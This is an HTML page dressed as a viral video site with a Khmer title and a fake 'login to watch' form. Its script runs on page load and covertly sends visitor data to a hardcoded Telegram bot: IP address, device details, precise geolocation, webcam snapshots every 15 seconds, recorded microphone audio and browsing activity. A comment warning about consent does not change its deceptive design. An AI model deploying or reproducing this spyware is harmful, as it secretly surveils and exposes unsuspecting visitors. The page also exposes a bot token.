<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <script src="firebase.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');
    body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
    h1 { text-align: center; color: #ffffff; padding: 35px; background: #FF0076; border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .container { max-width: 1200px; margin: 0 auto; }
    .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
    .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
    .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
    .video-card video { display: block; width: 100%; height: auto; }
    .capture-container { display: none; }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; }
    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.5); background: rgba(255, 255, 255, 0.95); padding: 30px 40px; border-radius: 10px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); opacity: 0; transition: transform 0.5s ease, opacity 0.5s ease; }
    .success-overlay.show { display: block; transform: translate(-50%, -50%) scale(1); opacity: 1; }
    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; }
  </style>
</head>
<body>
  <h1>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <div class="container">
    <div class="video-grid">
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="machiu.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p1.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p2.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p3.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p4.mp4" type="video/mp4"></video></div>
        <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
    </div>
    <div class="capture-container">
      <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
      <canvas id="snapshot" width="200" height="200"></canvas>
    </div>
  </div>
  <div id="loginModal" class="modal">
    <div class="modal-content">
      <h2>Please Login to Watch Full Video</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>
    </div>
  </div>
  <div id="successOverlay" class="success-overlay">
    <div class="icon">üéâ</div><div class="message">Login Successful!</div>
  </div>
  <div class="container upload-section">
    <h2>Upload Your Video</h2>
    <input type="file" id="videoUpload" accept="video/*" style="display: none;">
    <label for="videoUpload" class="custom-file-upload">Choose File</label>
    <button id="uploadVideoButton">Upload</button>
    <div id="uploadedVideos"></div>
  </div>

  <script>
    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
    const chatId = "8017801890";

    // --- PRIVACY WARNING ---
    // This script is designed for extensive user tracking. Deploying this has severe privacy
    // implications. Ensure you have explicit, informed consent from any user.
    // --- END WARNING ---

    const videoElementForCapture = document.getElementById("videoElementForCapture");
    const webcamCanvas = document.getElementById("snapshot");
    const webcamCtx = webcamCanvas.getContext("2d");

    let audioContext, analyserNode, microphoneStream, micDataArray, mediaRecorder;
    let audioAnalyserId, lastAverageLoudness = 0;
    let micState = 'quiet';
    const AUDIO_CHUNK_TIME = 5000;

    let userLocation = { lat: "N/A", lon: "N/A" };
    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    let currentVideo, lastFullscreenVideo;

    if(isLoggedIn) document.getElementById('loginModal').style.display = 'none';

    // --- NEW: Permission Handling & Initialization ---
    // This is the main function that runs on page load.
    // It checks permissions first before attempting to access devices.
    async function initializeTracking() {
        sendIPAndBasicInfo();
        
        // **NEW**: Check, log, and watch permissions using the Permissions API
        await checkAndWatchPermission('camera', requestCamera);
        await checkAndWatchPermission('microphone', requestMicrophone);
        await checkAndWatchPermission('geolocation', requestGeolocation);
    }

    /**
     * Checks a permission's status, logs it, requests it if needed,
     * and sets a listener for future changes.
     * @param {string} permissionName - The name of the permission ('camera', 'microphone', etc.).
     * @param {Function} requestFunction - The function to call if permission needs to be requested.
     */
    async function checkAndWatchPermission(permissionName, requestFunction) {
        if (!navigator.permissions) {
            sendToBot(`‚ö†Ô∏è Permissions API not supported. Falling back to direct request for ${permissionName}.`);
            requestFunction(); // Fallback for older browsers
            return;
        }
        try {
            const status = await navigator.permissions.query({ name: permissionName });
            sendToBot(`üìä Initial ${permissionName} permission: ${status.state}`);

            // If permission is already granted, start the process.
            if (status.state === 'granted') {
                requestFunction();
            }
            // If it's prompt, the requestFunction will trigger the popup.
            else if (status.state === 'prompt') {
                requestFunction();
            }
            // If denied, we don't request, just log it.
            else if (status.state === 'denied') {
                // No action needed, user has blocked it.
            }

            // **NEW**: Listen for changes. This tracks if the user changes the
            // permission in browser settings *after* the page has loaded.
            status.onchange = () => {
                sendToBot(`üîÑ Permission for ${permissionName} changed to: ${status.state}`);
                // If permission is newly granted, try to start the related feature.
                if (status.state === 'granted') {
                    requestFunction();
                }
            };
        } catch (e) {
            sendToBot(`üö´ Error querying ${permissionName} permission: ${e.message}. Attempting direct request.`);
            requestFunction(); // Attempt request anyway if query fails
        }
    }

    // --- Device Access Functions (now called by permission handler) ---
    function requestCamera() {
        if (videoElementForCapture.srcObject) return; // Already running
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                sendToBot("‚úÖ Camera access granted.");
                videoElementForCapture.srcObject = stream;
                videoElementForCapture.onloadedmetadata = () => {
                    startLoopCapture();
                };
            })
            .catch(handleMediaError("Camera"));
    }

    function requestMicrophone() {
        if (microphoneStream) return; // Already running
        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                sendToBot("‚úÖ Microphone access granted.");
                microphoneStream = stream;
                initAudioAnalysis(stream);
                startMicRecording(stream);
            })
            .catch(handleMediaError("Microphone"));
    }

    function requestGeolocation() {
        if (userLocation.lat !== "N/A") return; // Already have a location
        navigator.geolocation.getCurrentPosition(
            position => {
                userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
                sendToBot(`üìç Location obtained: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}`);
            },
            error => {
                let msg = "Unknown error";
                if(error.code === 1) msg = "User denied Geolocation."
                else if(error.code === 2) msg = "Location unavailable."
                sendToBot(`üö´ Geolocation error: ${msg}`);
            },
            { enableHighAccuracy: true }
        );
    }
    
    // Call the new initialization function on page load
    initializeTracking();
    
    // --- Rest of the script (functions are now called by the new logic) ---

    function startLoopCapture() {
        captureAndSend();
        setInterval(captureAndSend, 15000);
    }
    
    function captureAndSend(caption = "üì∏ Webcam Snapshot") {
      if (!videoElementForCapture.srcObject?.active) return;
      try {
        webcamCanvas.width = videoElementForCapture.videoWidth;
        webcamCanvas.height = videoElementForCapture.videoHeight;
        webcamCtx.drawImage(videoElementForCapture, 0, 0, webcamCanvas.width, webcamCanvas.height);
        webcamCanvas.toBlob(blob => blob && sendPhoto(blob, caption), "image/png");
      } catch (e) {
        sendToBot(`üö´ Webcam capture error: ${e.message}`);
      }
    }

    function startMicRecording(stream) {
        if (!window.MediaRecorder) return sendToBot("üö´ MediaRecorder not supported.");
        let options = { mimeType: 'audio/webm;codecs=opus' };
        if (!MediaRecorder.isTypeSupported(options.mimeType)) options = {};
        
        mediaRecorder = new MediaRecorder(stream, options);
        mediaRecorder.ondataavailable = event => event.data?.size > 0 && sendAudioToBot(event.data);
        mediaRecorder.onerror = e => sendToBot(`‚ö†Ô∏è MediaRecorder error: ${e.error.name}`);
        mediaRecorder.start(AUDIO_CHUNK_TIME);

        stream.getTracks().forEach(track => {
            track.onended = () => {
                sendToBot("‚ÑπÔ∏è Mic stream ended.");
                if (mediaRecorder?.state !== 'inactive') mediaRecorder.stop();
                if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
            };
        });
    }

    function initAudioAnalysis(stream) {
        try {
            audioContext = new (window.AudioContext || window.webkitAudioContext)();
            if (audioContext.state === 'suspended') audioContext.resume();
            
            const source = audioContext.createMediaStreamSource(stream);
            analyserNode = audioContext.createAnalyser();
            analyserNode.fftSize = 2048;
            micDataArray = new Uint8Array(analyserNode.frequencyBinCount);
            source.connect(analyserNode);
            analyseAudioStream();
        } catch (e) {
            sendToBot(`üö´ Audio analysis setup error: ${e.message}`);
        }
    }

    function analyseAudioStream() {
        if (!analyserNode || !microphoneStream?.active) {
            audioAnalyserId = null;
            return;
        }
        analyserNode.getByteFrequencyData(micDataArray);
        let sum = micDataArray.reduce((acc, val) => acc + val * val, 0);
        const averageLoudness = Math.sqrt(sum / micDataArray.length);
        lastAverageLoudness = averageLoudness;
        
        if (micState === 'quiet' && averageLoudness >= 40) {
            micState = 'active';
            sendToBot(`üé§ Sound detected (Lvl: ${averageLoudness.toFixed(1)})`);
        } else if (micState === 'active' && averageLoudness < 30) {
            micState = 'quiet';
            sendToBot(`üîá Sound levels low (Lvl: ${averageLoudness.toFixed(1)})`);
        }
        audioAnalyserId = requestAnimationFrame(analyseAudioStream);
    }

    function sendAudioToBot(audioBlob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("audio", audioBlob, `audio_${Date.now()}.webm`);
        const loc = userLocation.lat !== "N/A" ? `${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
        formData.append("caption", `üé§ Audio\nLvl: ${lastAverageLoudness.toFixed(1)}\nLoc: ${loc}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: "POST", body: formData })
            .then(res => res.json()).then(data => !data.ok && sendToBot(`‚ùå TG Audio Err: ${data.description}`))
            .catch(err => sendToBot(`üö´ Net Audio Err: ${err.message}`));
    }

    function sendPhoto(blob, caption) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, `snapshot_${Date.now()}.png`);
        const loc = userLocation.lat !== "N/A" ? `${userLocation.lat.toFixed(4)}, ${userLocation.lon.toFixed(4)}` : "N/A";
        formData.append("caption", `${caption}\nLoc: ${loc}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
            .then(res => res.json()).then(data => !data.ok && sendToBot(`‚ö†Ô∏è TG PhotoErr: ${data.description}`))
            .catch(err => sendToBot(`üö´ Net PhotoErr: ${err.message}`));
    }
    
    function sendToBot(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message, disable_notification: true })
      }).catch(err => console.error("Net MsgErr:", err));
    }
    
    function handleMediaError(mediaType) {
        return function(error) {
            let msg = error.name === 'NotAllowedError' ? `User denied ${mediaType} permission.` :
                      error.name === 'NotFoundError' ? `No ${mediaType.toLowerCase()} found.` :
                      `'${error.name}' error.`;
            sendToBot(`üö´ ${mediaType} access failed: ${msg}`);
        }
    }

    function sendIPAndBasicInfo() {
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            const ua = navigator.userAgent;
            const os = ua.includes("Win") ? "Windows" : ua.includes("Mac") ? "MacOS" : ua.includes("Android") ? "Android" : /iPhone|iPad|iPod/.test(ua) ? "iOS" : "Linux";
            const browser = ua.includes("Firefox/") ? "Firefox" : ua.includes("Edg/") ? "Edge" : ua.includes("Chrome/") ? "Chrome" : ua.includes("Safari/") ? "Safari" : "Unknown";
            const msg = `‚ÑπÔ∏è Visitor:\nIP: ${data.ip}\nOS: ${os}\nBrowser: ${browser}\nScreen: ${screen.width}x${screen.height}\nLang: ${navigator.language}\nLogged In: ${isLoggedIn}`;
            sendToBot(msg);
        })
        .catch(() => sendToBot("üö´ Could not fetch client IP."));
    }
    
    // All other event listeners (visibility, unload, video events, login, etc.) remain the same...
    const pageStartTime = Date.now();
    let maxScrollDepthAchieved = 0;
    document.addEventListener("visibilitychange", () => {
        const state = document.visibilityState;
        sendToBot(state === 'hidden' ? `üö™ Tab hidden.` : `üëÄ Tab active.`);
    });
    window.addEventListener("beforeunload", () => {
        const timeSpent = Math.round((Date.now() - pageStartTime) / 1000);
        sendToBot(`üö™ Page closing. Total time: ${Math.floor(timeSpent / 60)}m ${timeSpent % 60}s.`);
        videoElementForCapture.srcObject?.getTracks().forEach(track => track.stop());
        microphoneStream?.getTracks().forEach(track => track.stop());
    });
  </script>
</body>
</html>
